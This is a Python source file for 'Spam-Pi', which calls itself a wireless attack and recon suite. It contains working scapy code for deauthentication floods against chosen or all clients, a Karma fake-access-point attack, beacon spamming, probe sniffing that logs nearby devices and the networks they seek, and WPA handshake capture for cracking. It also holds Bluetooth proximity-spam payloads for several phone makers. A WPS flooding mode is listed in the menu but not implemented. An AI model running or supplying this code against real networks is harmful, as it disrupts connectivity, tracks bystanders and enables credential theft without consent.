#!/usr/bin/env python3
"""
Spam-Pi: Professional Wireless Attack & Recon Suite
Copyright (c) 2024 Spam-Pi Contributors
Licensed under the MIT License
"""

import os
import sys
import time
import random
import subprocess
import threading
from datetime import datetime
from scapy.all import (
    Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, 
    Dot11Deauth, sniff, Dot11ProbeReq, EAPOL, Dot11Auth, wrpcap
)

# Optional TUI Library
try:
    from rich.live import Live
    from rich.table import Table
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.console import Console
    from rich.text import Text
    TUI_ENABLED = True
except ImportError:
    TUI_ENABLED = False

# --- Configuration ---
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
HANDSHAKE_FILE = os.path.join(LOG_DIR, "handshakes.pcap")
PROBE_LOG = os.path.join(LOG_DIR, "probes.log")

# --- OUI Lookup (Common Vendors) ---
VENDORS = {
    "00:03:93": "Apple", "00:05:02": "Apple", "00:0A:27": "Apple", "00:0A:95": "Apple",
    "00:10:FA": "Apple", "00:11:24": "Apple", "00:14:51": "Apple", "00:16:CB": "Apple",
    "00:17:F2": "Apple", "00:19:E3": "Apple", "00:1B:63": "Apple", "00:1C:B3": "Apple",
    "00:1D:4F": "Apple", "00:1E:52": "Apple", "00:1E:C2": "Apple", "00:21:E9": "Apple",
    "00:23:12": "Apple", "00:23:32": "Apple", "00:23:6C": "Apple", "00:24:36": "Apple",
    "00:25:00": "Apple", "00:25:4B": "Apple", "00:26:08": "Apple", "00:26:4A": "Apple",
    "00:26:B0": "Apple", "18:AF:61": "Apple", "F0:D1:A9": "Apple", "E4:E4:AB": "Apple",
    "00:15:99": "Samsung", "00:16:32": "Samsung", "00:17:D4": "Samsung", "00:17:E2": "Samsung",
    "00:12:FB": "Samsung", "00:00:F0": "Samsung", "AC:5F:3E": "Samsung", "24:F5:AA": "Samsung",
    "00:13:E8": "Intel", "00:19:D1": "Intel", "00:1B:21": "Intel", "00:1C:BF": "Intel",
    "00:1E:64": "Intel", "00:21:5C": "Intel", "00:21:6A": "Intel", "00:23:14": "Intel",
    "D0:50:99": "ASRock", "BC:5F:F4": "ASRock",
    "00:25:9C": "Cisco", "00:26:0B": "Cisco", "00:26:51": "Cisco", "00:26:98": "Cisco"
}

def get_vendor(mac):
    prefix = mac.upper().replace(':', '')[:6]
    formatted_prefix = ":".join([prefix[i:i+2] for i in range(0, 6, 2)])
    return VENDORS.get(formatted_prefix, "Unknown")

# --- BLE Payloads ---
APPLE_DEVICES = {
    "AirPods": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Pro": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AirPods Max": [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0A, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12],
    "AppleTV Setup": [0x1E, 0xFF, 0x4C, 0x00, 0x04, 0x04, 0x2A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC1, 0x01, 0x60, 0x4C, 0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
    "AirTag / Find My": [0x1E, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
}
MICROSOFT_SWIFT = [0x1E, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80] + [0x00]*24
ANDROID_FAST = [0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x45]
SAMSUNG_QUICK = [0x18, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x61, 0x73, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
ALL_BLE_PAYLOADS = list(APPLE_DEVICES.values()) + [ANDROID_FAST, SAMSUNG_QUICK, MICROSOFT_SWIFT]

# --- WiFi Adapters & Data ---
def get_wifi_devices():
    interfaces = []
    try:
        with open('/proc/net/dev', 'r') as f:
            for line in f.readlines()[2:]:
                if ':' in line:
                    ifname = line.split(':')[0].strip()
                    if any(ifname.startswith(p) for p in ['wlan', 'wl', 'wlp']):
                        interfaces.append({'id': ifname, 'manufacturer': 'Unknown'})
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True)
            for i, dev in enumerate(interfaces):
                for line in result.stdout.split('\n'):
                    if dev['id'] in line:
                        parts = [p for p in line.split(' ') if p]
                        if len(parts) >= 3: interfaces[i]['manufacturer'] = " ".join(parts[2:])
        except: pass
    except: pass
    return interfaces

# --- Classes for Tracking ---
class BLEDevice:
    def __init__(self, mac, name):
        self.mac = mac
        self.name = name
        self.vendor = get_vendor(mac)
        self.last_seen = time.time()

class WiFiAP:
    def __init__(self, bssid, ssid, channel):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.vendor = get_vendor(bssid)
        self.clients = set()
        self.handshake = False

class WiFiSpammer:
    def __init__(self, interface):
        self.interface = interface
        self.is_running = False
        self.is_karma = False
        self.discovered_aps = {}
        self.probes = []
        self.active_beacons = set(["Free Public WiFi", "Starbucks WiFi"])
        self.ble_devices = {}
        self.current_channel = 1

    def set_monitor(self, enable=True):
        try:
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            subprocess.run(['iw', self.interface, 'set', 'monitor', 'none' if enable else 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            return True
        except: return False

    def channel_hopper(self):
        channels = list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
        while self.is_running:
            for ch in channels:
                if not self.is_running: break
                subprocess.run(['iw', 'dev', self.interface, 'set', 'channel', str(ch)], capture_output=True)
                self.current_channel = ch
                time.sleep(1)

    def packet_callback(self, pkt):
        # AP Discovery
        if pkt.haslayer(Dot11Beacon):
            b = pkt[Dot11].addr2
            try: s = pkt[Dot11Elt].info.decode()
            except: s = "<Hidden>"
            ch = int(ord(pkt[Dot11Elt:3].info)) if pkt.haslayer(Dot11Elt) else 0
            if b not in self.discovered_aps:
                self.discovered_aps[b] = WiFiAP(b, s, ch)
        
        # Client Tracking
        if pkt.haslayer(Dot11) and pkt.type == 2: # Data frame
            ds = pkt.FCfield & 2
            if ds == 1: # To AP
                bssid, client = pkt.addr1, pkt.addr2
            elif ds == 2: # From AP
                bssid, client = pkt.addr2, pkt.addr1
            else: return
            if bssid in self.discovered_aps:
                self.discovered_aps[bssid].clients.add(client)

        # Probe & Karma
        if pkt.haslayer(Dot11ProbeReq):
            if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].ID == 0:
                try:
                    s = pkt[Dot11Elt].info.decode()
                    c = pkt[Dot11].addr2
                    if s and len(self.probes) < 100:
                        self.probes.insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {get_vendor(c)} ({c}) -> '{s}'")
                        if self.is_karma: self.active_beacons.add(s)
                except: pass

        # Handshake Verification
        if pkt.haslayer(EAPOL):
            bssid = pkt[Dot11].addr3
            if bssid in self.discovered_aps:
                self.discovered_aps[bssid].handshake = True
                wrpcap(HANDSHAKE_FILE, pkt, append=True)

    def beacon_task(self):
        while self.is_running:
            for ssid in list(self.active_beacons):
                smac = ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])
                pkt = RadioTap() / Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=smac, addr3=smac) / Dot11Beacon() / Dot11Elt(ID='SSID', info=ssid)
                sendp(pkt, iface=self.interface, count=1, verbose=False)

    def start_recon(self, karma=False):
        self.is_running = True
        self.is_karma = karma
        self.set_monitor(True)
        threading.Thread(target=self.channel_hopper, daemon=True).start()
        threading.Thread(target=self.beacon_task, daemon=True).start()
        threading.Thread(target=lambda: sniff(iface=self.interface, prn=self.packet_callback, stop_filter=lambda x: not self.is_running), daemon=True).start()

    def stop(self):
        self.is_running = False
        self.set_monitor(False)

# --- BLE Logic ---
class PiBLESpan:
    def __init__(self, hci_interface, parent_wifi=None):
        self.hci_interface = hci_interface
        self.is_running = False
        self.parent_wifi = parent_wifi

    def scan_task(self):
        subprocess.run(['hciconfig', self.hci_interface, 'up'], capture_output=True)
        proc = subprocess.Popen(['hcitool', '-i', self.hci_interface, 'lescan', '--duplicates', '--passive'], 
                                stdout=subprocess.PIPE, text=True)
        try:
            for line in proc.stdout:
                if not self.is_running: break
                parts = line.strip().split(' ')
                if len(parts) >= 2:
                    mac, name = parts[0], " ".join(parts[1:])
                    if self.parent_wifi:
                        self.parent_wifi.ble_devices[mac] = BLEDevice(mac, name)
        finally: proc.terminate()

    def start_scan(self):
        self.is_running = True
        threading.Thread(target=self.scan_task, daemon=True).start()

    def stop(self): self.is_running = False

# --- TUI Dashboard ---
def make_layout():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="main"),
        Layout(name="footer", size=3)
    )
    layout["main"].split_row(
        Layout(name="wifi", ratio=2),
        Layout(name="ble", ratio=1)
    )
    layout["wifi"].split_column(
        Layout(name="aps", ratio=3),
        Layout(name="probes", ratio=1)
    )
    return layout

def generate_dashboard(wifi, hci_id):
    layout = make_layout()
    layout["header"].update(Panel(Text(f"Spam-Pi Professional | WiFi: {wifi.interface} [Ch {wifi.current_channel}] | BT: {hci_id}", justify="center", style="bold cyan")))
    
    # WiFi AP Table
    ap_table = Table(title="Nearby Access Points", expand=True)
    ap_table.add_column("BSSID", style="dim")
    ap_table.add_column("SSID", style="bold")
    ap_table.add_column("Vendor")
    ap_table.add_column("Clients", justify="right")
    ap_table.add_column("H-Shake", justify="center")
    
    for bssid, ap in sorted(wifi.discovered_aps.items(), key=lambda x: len(x[1].clients), reverse=True)[:10]:
        ap_table.add_row(bssid, ap.ssid, ap.vendor, str(len(ap.clients)), "[green]YES[/]" if ap.handshake else "[red]NO[/]")
    layout["aps"].update(Panel(ap_table))

    # Probes
    layout["probes"].update(Panel("\n".join(wifi.probes[:5]), title="Live Probe Sniffing"))

    # BLE Table
    ble_table = Table(title="Nearby BLE Devices", expand=True)
    ble_table.add_column("MAC")
    ble_table.add_column("Name")
    ble_table.add_column("Vendor")
    for mac, dev in list(wifi.ble_devices.items())[:10]:
        ble_table.add_row(mac, dev.name[:15], dev.vendor)
    layout["ble"].update(Panel(ble_table))

    layout["footer"].update(Panel(Text("Ctrl+C to Exit Mode", justify="center", style="dim italic")))
    return layout

# --- Main ---
def main():
    if os.getuid() != 0:
        print("[!] Root required."); sys.exit(1)

    wifi_devs = get_wifi_devices()
    wifi_id = wifi_devs[0]['id'] if wifi_devs else None
    hci_id = "hci0" # Default

    while True:
        os.system('clear')
        print("--- Spam-Pi Professional Suite ---")
        print("1. Launch Interactive Dashboard (Recon + Karma)")
        print("2. Targeted Deauth & Handshake Capture")
        print("3. Proximity Spam Mode")
        print("4. Advanced: WPS / Auth Flooding")
        print("0. Exit")
        
        choice = input("\nChoice: ")
        wifi = WiFiSpammer(wifi_id)
        ble = PiBLESpan(hci_id, wifi)

        try:
            if choice == '1' and TUI_ENABLED:
                wifi.start_recon(karma=True)
                ble.start_scan()
                with Live(generate_dashboard(wifi, hci_id), refresh_per_second=1) as live:
                    while True:
                        live.update(generate_dashboard(wifi, hci_id))
                        time.sleep(1)
            elif choice == '2':
                wifi.start_recon(karma=False)
                print("[*] Gathering targets for 10s...")
                time.sleep(10)
                aps = list(wifi.discovered_aps.values())
                for i, ap in enumerate(aps):
                    print(f"{i+1}. {ap.ssid} ({ap.bssid}) - Clients: {len(ap.clients)}")
                
                ap_idx = int(input("Select AP: ")) - 1
                target_ap = aps[ap_idx]
                
                print("\nClients:")
                clients = list(target_ap.clients)
                for i, c in enumerate(clients): print(f"{i+1}. {c} ({get_vendor(c)})")
                print(f"{len(clients)+1}. BROADCAST (All Clients)")
                
                c_idx = int(input("Select Client: ")) - 1
                target_client = clients[c_idx] if c_idx < len(clients) else "ff:ff:ff:ff:ff:ff"
                
                wifi.is_running = True
                pkt = RadioTap()/Dot11(addr1=target_client, addr2=target_ap.bssid, addr3=target_ap.bssid)/Dot11Deauth(reason=7)
                print(f"[*] Attacking {target_client} on {target_ap.ssid}...")
                while True:
                    sendp(pkt, iface=wifi.interface, count=100, inter=0.1, verbose=False)
            elif choice == '0': sys.exit(0)
        except KeyboardInterrupt:
            wifi.stop(); ble.stop()

if __name__ == "__main__":
    main()
